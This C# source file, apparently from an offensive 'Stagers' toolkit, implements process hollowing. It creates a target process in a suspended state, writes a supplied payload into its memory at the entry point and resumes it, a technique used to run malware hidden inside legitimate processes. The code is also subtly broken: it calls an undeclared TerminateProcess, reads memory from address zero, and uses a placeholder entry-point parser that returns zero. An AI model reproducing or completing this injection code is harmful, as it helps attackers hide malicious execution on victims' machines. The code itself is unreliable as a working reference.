using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Stagers.Common;

public class ProcessHollowing
{
    [StructLayout(LayoutKind.Sequential)]
    protected struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    protected struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    protected static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);
    }

    public async Task HollowProcess(string targetProcess, byte[] payload)
    {
        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        
        var pi = new PROCESS_INFORMATION();
        
        // Create the target process in suspended state
        var success = NativeMethods.CreateProcess(
            null,
            targetProcess,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            0x4, // CREATE_SUSPENDED
            IntPtr.Zero,
            null,
            ref si,
            out pi);

        if (!success)
            throw new Exception("Failed to create target process");

        try
        {
            // Read the target process memory to find the entry point
            var baseAddress = await Task.Run(() =>
            {
                var buf = new byte[0x200];
                IntPtr bytesRead;
                NativeMethods.ReadProcessMemory(pi.hProcess, IntPtr.Zero, buf, buf.Length, out bytesRead);
                return GetEntryPoint(buf);
            });

            // Write the payload to the entry point
            IntPtr bytesWritten;
            success = NativeMethods.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                payload,
                payload.Length,
                out bytesWritten);

            if (!success)
                throw new Exception("Failed to write payload to target process");

            // Resume the main thread
            NativeMethods.ResumeThread(pi.hThread);
        }
        catch
        {
            // Clean up on failure
            if (pi.hProcess != IntPtr.Zero)
                NativeMethods.TerminateProcess(pi.hProcess, 1);
        }
    }

    private IntPtr GetEntryPoint(byte[] headerData)
    {
        // Parse PE header to find entry point
        // Implementation details omitted for brevity
        return IntPtr.Zero; // Placeholder
    }
}
